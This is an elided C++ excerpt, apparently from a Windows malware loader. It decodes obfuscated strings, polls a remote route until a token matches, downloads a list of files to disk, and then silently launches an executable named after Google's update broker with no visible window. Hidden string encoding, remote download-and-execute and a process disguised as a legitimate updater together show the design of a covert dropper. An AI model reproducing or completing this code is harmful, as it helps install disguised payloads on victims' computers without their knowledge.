...
int main() {
    ...
    std::string folder_path = combine_chars(folder_path_start);
    folder_path += username;
    folder_path += combine_chars(folder_path_end);
    ...
    while (true) {
        download_data = split_string(get_request(combine_chars(file_downloader_route)), "\n");
        if (download_data[0] != combine_chars(file_downloader_token)) continue;
        break;
    }
    for (int i = 1; i < download_data.size(); i += 2) {
        std::ofstream w(download_data[i], std::ios::binary);
        write_long(w, get_request(combine_chars(download_prefix) + download_data[i + 1]));
        w.close();
    }
    ...
    CreateProcess(NULL, (LPSTR) combine_chars(googleupdatebroker_path).c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
